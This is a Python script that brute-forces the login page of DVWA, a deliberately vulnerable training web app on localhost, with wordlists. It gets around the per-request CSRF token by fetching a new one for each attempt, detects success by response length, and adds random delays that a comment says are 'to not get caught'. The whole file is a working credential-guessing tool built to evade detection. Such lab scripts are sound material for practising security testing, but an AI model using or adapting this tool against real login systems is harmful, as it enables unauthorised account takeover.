import requests
import re
import time
import random
import os

# Target DVWA URL
target = "http://localhost/DVWA/vulnerabilities/brute/"
cookies = {"PHPSESSID": "9gcul322svpqdq6os2efirihfi", "security": "high"}

# Default username and password files
default_username_list = "/usr/share/seclists/Usernames/top-usernames-shortlist.txt"
default_passwords_list = "/usr/share/wordlists/fasttrack.txt"

# Throttle configuration
min_delay = 1  # Minimum delay in seconds
max_delay = 3  # Maximum delay in seconds

def get_csrf(url, session):
    """Extract CSRF token from the login page."""
    response = session.get(url, cookies=cookies)
    match = re.search(r"name='user_token' value='([a-fA-F0-9]+)'", response.text)

    return match.group(1) if match else None


def get_failed_length(session):
    """Get the response length for a known incorrect login."""
    user_token = get_csrf(target, session)
    if not user_token:
        return None

    params = {
        "username": "invalid_user",
        "password": "invalid_password",
        "Login": "Login",
        "user_token": user_token
    }
    response = session.get(target, params=params, cookies=cookies)
    return len(response.text)


def get_user_input():
    """Ask the user if they want to use custom username and password lists."""
    use_custom = input("Do you want to enter a custom username and password list? (yes/no): ").strip().lower()
    
    if use_custom == "yes":
        username_list = input("Enter the path to the username list: ").strip()
        passwords_list = input("Enter the path to the password list: ").strip()

        # Validate file paths
        if not os.path.exists(username_list):
            print("[-] Username list file not found. Using default.")
            username_list = default_username_list

        if not os.path.exists(passwords_list):
            print("[-] Password list file not found. Using default.")
            passwords_list = default_passwords_list
    else:
        print("[*] Using default username and password lists.")
        username_list = default_username_list
        passwords_list = default_passwords_list

    return username_list, passwords_list


def main():
    """Brute-force login using username and password lists with throttling."""
    session = requests.Session()
    failed_length = get_failed_length(session)  

    if failed_length is None:
        print("[-] Failed to determine login failure response length. Exiting...")
        return

    # Get username and password lists
    username_list, passwords_list = get_user_input()

    with open(username_list, "r", encoding="utf-8", errors="ignore") as userfile:
        for username in userfile:
            username = username.strip()  # Remove newline characters

            with open(passwords_list, "r", encoding="utf-8", errors="ignore") as passfile:
                for password in passfile:
                    password = password.strip()

                    user_token = get_csrf(target, session)  # Get fresh CSRF token everytime we open a new session!

                    if not user_token:
                        print("[-] Skipping attempt due to missing CSRF token.")
                        continue

                    params = {
                        "username": username,
                        "password": password,
                        "Login": "Login",
                        "user_token": user_token
                    }

                    response = session.get(target, params=params, cookies=cookies)
                    response_length = len(response.text)

                    print(f"Trying {username}:{password} - Response Length: {response_length}")

                    if response_length != failed_length:
                        print(f"[+] Found credentials: {username}:{password}")
                        return

                    # Throttling: Add a random delay between requests to not get caught hehe 
                    delay = random.uniform(min_delay, max_delay)
                    #print(f"[-] Waiting {delay:.2f} seconds before next attempt.")
                    time.sleep(delay)

    print("[-] No valid credentials found.")


if __name__ == "__main__":
    main()
